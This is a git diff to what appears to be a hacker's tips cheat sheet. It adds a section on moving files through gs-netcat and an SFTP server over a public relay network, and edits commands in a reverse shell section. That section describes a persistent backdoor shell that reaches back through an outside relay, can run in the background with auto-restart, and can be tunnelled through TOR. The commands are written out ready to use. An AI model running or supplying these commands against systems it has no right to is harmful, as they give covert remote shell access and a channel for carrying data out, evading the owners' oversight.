@@ -30,6 +30,7 @@ Got tricks? Send them to root@thc.org or submit a pull request.
    1. [Multiple binaries](#feb-anchor)
    1. [File transfer using screen from REMOTE to LOCAL](#ftsrl-anchor)
    1. [File transfer using screen from LOCAL to REMOTE](#ftslr-anchor)
+   1. [File transfer using gs-netcat and sftp](#ftgs-anchor)
 5. [Reverse Shell / Dumb Shell](#rs-anchor)
    1. [Reverse Shells](#rs-anchor)
       1. [with gs-netcat](#rswg-anchor)
@@ -320,6 +321,20 @@ Get *screen* to slurp the base64 encoded data into screen's clipboard and paste 
 
 Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/openssl/issues/9355).
 
+<a id="ftgs-achor"></a>
+**4.vii. File transfer - using gs-netcat and sftp**
+
+Install [gs-netcat](https://github.com/hackerschoice/gsocket). This commands runs a SFTP server through the Global Socket Relay Network:
+```
+$ gs-netcat -s MySecret -l -e /usr/lib/sftp-server         # Host
+```
+
+From your workstation execute this command to connect to the SFTP server:
+```
+$ export GSOCKET_ARGS="-s MySecret"                        # Workstation
+$ sftp -D gs-netcat                                        # Workstation
+```
+
 ---
 <a id="rs-anchor"></a>
 <a id="rswg-anchor"></a>
@@ -328,13 +343,13 @@ Note: Two C-d are required due to a [bug in openssl](https://github.com/openssl/
 Install [gs-netcat](https://github.com/hackerschoice/gsocket). It spawns a fully functioning PTY reverse shell and using the Global Socket Relay network. This means you do not need to run your own Command & Control server for the backdoor to connect back to. If netcat is the equivalent to a swiss army knife than gs-netcat is a german battle axe :>
 
 ```
-$ ./gs-netcat -s MySecret -l -i    # Host
+$ gs-netcat -s MySecret -l -i    # Host
 ```
 Use -D to start the reverse shell in the background (daemon) and with a watchdog to auto-restart if killed.
 
 To connect to the shell from your workstation:
 ```
-$ ./gs-netcat -s MySecret -i
+$ gs-netcat -s MySecret -i
 ```
 Use -T to tunnel trough TOR.
 
